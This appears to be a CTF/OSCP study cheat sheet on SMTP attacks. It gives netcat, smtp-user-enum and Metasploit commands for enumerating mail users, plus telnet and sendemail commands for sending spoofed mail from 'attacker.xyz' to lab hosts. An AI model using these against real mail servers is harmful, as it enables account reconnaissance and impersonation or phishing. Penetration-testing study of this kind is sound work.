* [SMTP](#smtp)
  * [grab banner](#grab-banner)
  * [enumerating username](#enumerating-username)
    * [using commands](#using-commands)
    * [`smtp-user-enum`](#smtp-user-enum)
    * [metasploit `smtp_enum`](#metasploit-smtp_enum)
  * [send mail](#send-mail)
    * [using `telnet`](#using-telnet)
    * [using `sendemail`](#using-sendemail)

# SMTP
## grab banner
### nmap
<https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#banner>
### nc
<https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nc.md#banner-grabbing>

## enumerating username
### using commands
Refs
* <https://blog.mailtrap.io/smtp-commands-and-responses/>

Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands.
#### `VRFY`
```sh
netcat 192.91.109.3 25
HELP
HELO abc
VRFY admin@victim-1
```
#### `EXPN`
```sh
netcat 192.91.109.3 25
HELP
HELO abc
EXPN admin@victim-1
250 2.1.5 <admin@victim-1>
```
#### `RCPT TO`
```sh
netcat 192.91.109.3 25
HELP
HELO abc
MAIL FROM:a@victim-1
250 2.1.0 a@victim-1... Sender ok
RCPT TO:admin@victim-1
250 2.1.5 admin@victim-1... Recipient ok (will queue)
```
### `smtp-user-enum`
Refs :
* <https://tools.kali.org/information-gathering/smtp-user-enum>
* <http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum>
```sh
# Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
smtp-user-enum -U usernames.txt -t 192.186.235.3
```
### metasploit `smtp_enum`

> msfconsole \
> use auxiliary/scanner/smtp/smtp_enum \
> set RHOSTS 192.186.235.3 \
> exploit 
## send mail
### using `telnet`
```sh
telnet 192.186.235.3 25
HELO attacker.xyz
MAIL FROM: admin@attacker.xyz
RCPT TO: root@victim-1
DATA
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```
Note: There is a dot(.) in the last line which indicates the termination of data.
### using `sendemail`
```sh
$ sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.91.109.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no
May 15 09:21:55 attackdefense sendemail[110]: Email was sent successfully!
```
